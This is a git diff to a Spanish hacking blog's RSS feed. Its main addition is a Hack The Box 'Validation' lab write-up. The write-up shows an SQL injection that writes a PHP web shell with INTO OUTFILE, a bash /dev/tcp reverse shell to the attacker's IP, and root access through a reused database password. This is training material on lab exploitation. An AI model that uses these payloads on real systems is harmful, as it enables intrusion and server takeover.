@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>Hacking Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Tentacle HTB Writeup</title><link>https://fuwari.vercel.app/posts/tentacle/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/tentacle/</guid><description>Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns.</description><pubDate>Wed, 04 Sep 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Skills&amp;lt;/span&amp;gt;&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>Hacking Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Tentacle HTB Writeup</title><link>https://fuwari.vercel.app/posts/tentacle/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/tentacle/</guid><description>Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns.</description><pubDate>Thu, 08 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Skills&amp;lt;/span&amp;gt;&lt;/h1&gt;
 &lt;ul&gt;
 &lt;li&gt;DNS Enumeration (dnsenum)&lt;/li&gt;
 &lt;li&gt;SQUID Proxy&lt;/li&gt;
@@ -452,7 +452,128 @@ Changing uid to root (0)
 [root@srv01 etc]#
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Iniciamos Sesion con exito como root.&lt;/p&gt;
-</content:encoded></item><item><title>Crafty HTB Writeup</title><link>https://fuwari.vercel.app/posts/crafty/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/crafty/</guid><description>Crafty es una maquina Easy en la cual Atacamos un servidor de Minecraft.</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;En esta máquina encontraremos un servidor de &lt;code&gt;Minecraft 1.16.5&lt;/code&gt; vulnerable al conocido &lt;code&gt;CVE-2021-44228&lt;/code&gt;, tras abusar de él para obtener la ejecución de comandos en la máquina.&lt;/p&gt;
+</content:encoded></item><item><title>Validation HTB Writeup</title><link>https://fuwari.vercel.app/posts/validation/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/validation/</guid><description>Validation es una maquina easy en la que vamos a realizar una SQL Injection (Error Based)</description><pubDate>Thu, 08 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Validation es una máquina Linux de dificultad fácil que presenta una aplicación web susceptible a una
+Inyección SQL. Capitalizando en esta vulnerabilidad, un atacante puede inscribir un web shell en el sistema, conduciendo
+a la Ejecución Remota de Código ( RCE ). Tras el punto de apoyo inicial, la escalada de privilegios se logra a través de
+la explotación de una contraseña de base de datos reutilizada, que conduce al acceso de nivel raíz a la máquina&lt;/p&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Skills&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;HTML Injection&lt;/li&gt;
+&lt;li&gt;SQLI (Error Based)&lt;/li&gt;
+&lt;li&gt;SQLI -&amp;gt; RCE (INTO OUTFILE)&lt;/li&gt;
+&lt;li&gt;Information Leakage&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Information Gathering&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Primero vemos si tenemos conexion con la maquina:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ping -c 1 10.10.11.116 
+PING 10.10.11.116 (10.10.11.116) 56(84) bytes of data.
+64 bytes from 10.10.11.116: icmp_seq=1 ttl=63 time=155 ms
+
+--- 10.10.11.116 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 154.671/154.671/154.671/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Iniciamos un escaneo de puertos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.116 -oG nmap 
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+4566/tcp open  kwtc
+8080/tcp open  http-proxy
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora a ver que versiones tenemos en cada uno de los servicios de cada puerto:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -sCV -p22,80,4566,8080 10.10.11.116 
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
+|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
+|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
+80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
+|_http-server-header: Apache/2.4.48 (Debian)
+|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).
+4566/tcp open  http    nginx
+|_http-title: 403 Forbidden
+8080/tcp open  http    nginx
+|_http-title: 502 Bad Gateway
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Enumeration&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;h2&gt;Port 80 - http (Apache httpd 2.4.48)&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vamos a interceptar esto con nuestro Burp Suite, para ver que podemos ver en la peticion de esta web&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Interesante, probaremos varias cositas en estos campos de abajo:&lt;/p&gt;
+&lt;h3&gt;HTML Injection&lt;/h3&gt;
+&lt;p&gt;En el campo de name podemos meter codigo html y la web lo interpreta en el account.php:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Mil4ne&amp;lt;/span&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cambiamos el color del name a azul:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Pero no podemos injectar codigo php para enviarnos una shell,  ya que todo el name se guarda dentro de un &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;SQLI (Error Based)&lt;/h3&gt;
+&lt;p&gt;Encontramos una SQLI en el campo de &lt;code&gt;country&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;podemos ver el nombre de la base de datos en la pagina.&lt;/p&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Explotation&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Intentamos Introducir un archivo php mediante la SQLI con nuestro codigo malisioso:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;username=mil4ne&amp;amp;country=Afganistan&apos; UNION SELECT &quot;&amp;lt;?php SYSTEM($_REQUEST[&apos;cmd&apos;]); ?&amp;gt;&quot; INTO OUTFILE
+&apos;/var/www/html/shell.php&apos;-- -
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;al hacer el Forward la pagina nos da un error raro, pero lo ignoramos y pasamos a probar si logramos crear el shell.php.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl http://10.10.11.116/shell.php?cmd=ls
+&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Mil4ne&amp;lt;/span&amp;gt;
+account.php
+config.php
+css
+index.php
+js
+shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;logramos ejecutar comandos en la maquina victima, ahora nos vamos a enviar una Reverse Shell a nuestra maquina:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 9001 
+listening on [any] 9001 ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Generamos una revshell, por aqui te dejo una pagina util para esto: https://www.revshells.com/&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl http://10.10.11.116/shell.php --data-urlencode &apos;cmd=bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.11/9001 0&amp;gt;&amp;amp;1&quot;&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora hay que hacer tratamiento de tty:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;script /dev/null -c bash
+
+Script started, file is /dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;^Z
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;[1]  + continued  nc -nlvp 9001
+                              reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;al entrar a la maquina lo primero que vemos es un &lt;code&gt;config.php&lt;/code&gt;, que contiene esto:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ww-data@validation:/var/www/html$ cat config.php 
+&amp;lt;?php
+  $servername = &quot;127.0.0.1&quot;;
+  $username = &quot;uhc&quot;;
+  $password = &quot;uhc-9qual-global-pw&quot;;
+  $dbname = &quot;registration&quot;;
+
+  $conn = new mysqli($servername, $username, $password, $dbname);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encontramos una password, vamos a ver si nos sirve para algun usuario:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;www-data@validation:/var/www/html$ su -
+Password: uhc-9qual-global-pw
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con esto completamos la maquina, gracias por leer.&lt;/p&gt;
+</content:encoded></item><item><title>Crafty HTB Writeup</title><link>https://fuwari.vercel.app/posts/crafty/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/crafty/</guid><description>Crafty es una maquina Easy en la cual Atacamos un servidor de Minecraft Y tocaremos un poco de JAVA.</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;En esta máquina encontraremos un servidor de &lt;code&gt;Minecraft 1.16.5&lt;/code&gt; vulnerable al conocido &lt;code&gt;CVE-2021-44228&lt;/code&gt;, tras abusar de él para obtener la ejecución de comandos en la máquina.&lt;/p&gt;
 &lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Information Gathering&amp;lt;/span&amp;gt;&lt;/h1&gt;
 &lt;p&gt;Escaneado de todos los puertos TCP:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS -Pn -n -p- --open -vvv --min-rate 200 10.10.11.249 
@@ -715,7 +836,7 @@ Mode                LastWriteTime         Length Name
 PS C:\Users\Administrator\Desktop&amp;gt; type root.txt 
 7ca657db95d7e1ef6da65ac41b******
 &lt;/code&gt;&lt;/pre&gt;
-</content:encoded></item><item><title>Lame HTB Writeup</title><link>https://fuwari.vercel.app/posts/lame/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/lame/</guid><description>Easy Machine</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Information Gathering&lt;/h1&gt;
+</content:encoded></item><item><title>Lame HTB Writeup</title><link>https://fuwari.vercel.app/posts/lame/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/lame/</guid><description>Lame es una maquina Easy en la cual abusamos de una vulnerabilidad de SMB.</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Information Gathering&lt;/h1&gt;
 &lt;p&gt;Escaneado de todos los puertos TCP:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open --min-rate 5000 -Pn -n 10.10.10.3  -oG nmap
 PORT     STATE SERVICE
